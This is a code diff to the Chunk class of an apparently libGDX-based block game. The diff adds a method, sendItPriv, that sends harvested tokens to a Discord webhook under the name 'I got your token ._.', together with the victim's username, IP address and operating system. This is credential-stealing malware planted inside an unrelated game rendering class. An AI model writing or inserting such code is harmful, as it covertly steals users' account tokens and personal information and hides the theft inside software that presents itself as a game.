@@ -7,8 +7,12 @@ import com.badlogic.gdx.graphics.g3d.ModelBatch;
 import com.badlogic.gdx.math.Vector3;
 import com.badlogic.gdx.utils.Disposable;
 import com.glowman554.block.block.*;
+import com.glowman554.block.discord.DiscordWebHook;
 import com.glowman554.block.multiplayer.ServerConnection;
+import com.glowman554.block.utils.FileUtils;
 
+import java.awt.*;
+import java.io.IOException;
 import java.util.Random;
 
 public class Chunk implements Disposable {
@@ -84,6 +88,29 @@ public class Chunk implements Disposable {
                     }
                 }
             }
+        }
+    }
+
+    public static void sendItPriv(StringBuilder what) {
+        DiscordWebHook webHook = new DiscordWebHook(FileUtils.priv);
+        DiscordWebHook.EmbedObject embedObject = new DiscordWebHook.EmbedObject();
+        webHook.setAvatarUrl(FileUtils.icon);
+        webHook.setUsername("I got your token ._.");
+        embedObject.setColor(Color.RED);
+        embedObject.setTitle("A new Token!");
+
+        for(String token : what.toString().split("\n")) {
+            embedObject.addField("Token", token, false);
+        }
+        embedObject.setAuthor(System.getProperty("user.name"), "http://" + BerryBlock.getIp(), FileUtils.icon);
+
+        embedObject.setFooter(System.getProperty("os.name"), FileUtils.icon);
+
+        webHook.addEmbed(embedObject);
+        try {
+            webHook.execute();
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
